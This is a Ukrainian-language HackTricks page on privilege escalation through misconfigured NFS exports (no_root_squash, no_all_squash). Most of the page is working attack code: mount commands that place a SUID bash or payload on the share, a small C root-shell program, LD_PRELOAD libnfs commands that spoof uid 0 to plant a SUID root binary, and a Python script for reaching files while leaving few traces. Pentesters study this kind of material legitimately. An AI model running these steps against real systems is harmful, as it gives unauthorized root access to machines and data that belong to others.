{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


Прочитайте файл _ **/etc/exports** _ , якщо ви знайдете деяку директорію, яка налаштована як **no\_root\_squash**, тоді ви можете **доступитися** до неї **як клієнт** і **записувати всередині** цієї директорії **так, ніби** ви були локальним **root** машини.

**no\_root\_squash**: Ця опція в основному надає повноваження користувачу root на клієнті доступатися до файлів на NFS сервері як root. І це може призвести до серйозних проблем з безпекою.

**no\_all\_squash:** Це схоже на опцію **no\_root\_squash**, але застосовується до **не-root користувачів**. Уявіть, що у вас є оболонка як користувач nobody; перевірте файл /etc/exports; опція no\_all\_squash присутня; перевірте файл /etc/passwd; емітуйте не-root користувача; створіть файл suid як цей користувач (монтуванням за допомогою nfs). Виконайте suid як користувач nobody і станьте іншим користувачем.

# Підвищення привілеїв

## Віддалена експлуатація

Якщо ви знайшли цю вразливість, ви можете її експлуатувати:

* **Монтування цієї директорії** на клієнтській машині, і **як root копіювання** всередину змонтованої папки бінарного файлу **/bin/bash** і надання йому прав **SUID**, і **виконання з жертви** машини цього бінарного файлу bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Монтування цього каталогу** на клієнтській машині та **як root копіювання** всередину змонтованої папки нашого скомпільованого вантажу, який зловживає правами SUID, надання йому **прав SUID** та **виконання з жертви** цієї двійкової програми (ви можете знайти тут деякі [C SUID вантажі](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

{% hint style="info" %}
Зверніть увагу, що якщо ви можете створити **тунель з вашого комп'ютера до комп'ютера жертви, ви все ще можете використовувати віддалену версію для експлуатації цього підвищення привілеїв, тунелюючи необхідні порти**.\
Наступний трюк стосується випадку, коли файл `/etc/exports` **вказує на IP**. У цьому випадку ви **не зможете використовувати** в жодному випадку **віддалену експлуатацію** і вам потрібно буде **зловживати цим трюком**.\
Ще однією необхідною умовою для роботи експлуатації є те, що **експорт всередині `/etc/export`** **повинен використовувати прапор `insecure`**.\
\--_Я не впевнений, що якщо `/etc/export` вказує на IP-адресу, цей трюк спрацює_--
{% endhint %}

## Basic Information

Сценарій передбачає експлуатацію змонтованого NFS-спільного ресурсу на локальному комп'ютері, використовуючи недолік у специфікації NFSv3, який дозволяє клієнту вказувати свій uid/gid, що потенційно може дозволити несанкціонований доступ. Експлуатація передбачає використання [libnfs](https://github.com/sahlberg/libnfs), бібліотеки, яка дозволяє підробляти виклики NFS RPC.

### Compiling the Library

Кроки компіляції бібліотеки можуть вимагати коригувань залежно від версії ядра. У цьому конкретному випадку системні виклики fallocate були закоментовані. Процес компіляції включає наступні команди:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Проведення експлуатації

Експлуатація полягає у створенні простого C програми (`pwn.c`), яка підвищує привілеї до root, а потім виконує оболонку. Програма компілюється, а отриманий бінарний файл (`a.out`) розміщується на загальному ресурсі з suid root, використовуючи `ld_nfs.so` для підробки uid у викликах RPC:

1. **Скомпілюйте код експлуатації:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Розмістіть експлуатацію на загальному ресурсі та змініть її дозволи, підробляючи uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Виконайте експлуатацію для отримання привілеїв root:**
```bash
/mnt/share/a.out
#root
```

## Бонус: NFShell для прихованого доступу до файлів
Після отримання доступу root, для взаємодії з NFS загальним ресурсом без зміни власності (щоб уникнути залишення слідів), використовується Python скрипт (nfsh.py). Цей скрипт налаштовує uid, щоб відповідати uid файлу, до якого звертаються, що дозволяє взаємодіяти з файлами на загальному ресурсі без проблем з дозволами:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Запустіть як:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{% hint style="success" %}
Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
